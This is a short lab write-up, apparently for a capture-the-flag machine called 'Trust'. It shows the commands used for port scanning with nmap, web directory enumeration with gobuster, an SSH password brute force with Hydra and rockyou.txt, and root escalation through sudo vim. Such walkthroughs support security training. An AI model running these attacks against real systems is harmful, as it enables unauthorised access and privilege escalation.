## Ping

``` bash
ping -c 1 172.18.0.2
```

![[Pasted image 20250330033058.png]]
***Trust*** is a Linux Machine

## Port Analysis

``` bash
sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.18.0.2 -oN ports
```
![[Pasted image 20250330034133.png]]
Opened:
- Port 22 (ssh): Connect to the system
- Port 80 (HTTP): Web page

## Find hidden web directories

Searches for hidden directories and files.
``` bash
sudo gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.18.0.2/" -x .php,.sh,.py,.txt
```

![[Pasted image 20250329042633.png]]
![[Pasted image 20250330034316.png]]
**User:** mario

## Brutal force password

This command **performs a brute-force attack** on the **SSH service** using the **Hydra** tool.
``` bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

![[Pasted image 20250329043510.png]]

## Sudo commands without password

**Lists the commands that the current user can run with `sudo` privileges** without needing a password.
``` bash
sudo -l
```

![[Pasted image 20250329044236.png]]


## Escalation with Vim

This command will open the **Vim editor** as the `root` user if the user is able to execute vim as root with sudo.
``` bash
sudo -u root /usr/bin/vim
```

![[Pasted image 20250329044631.png]]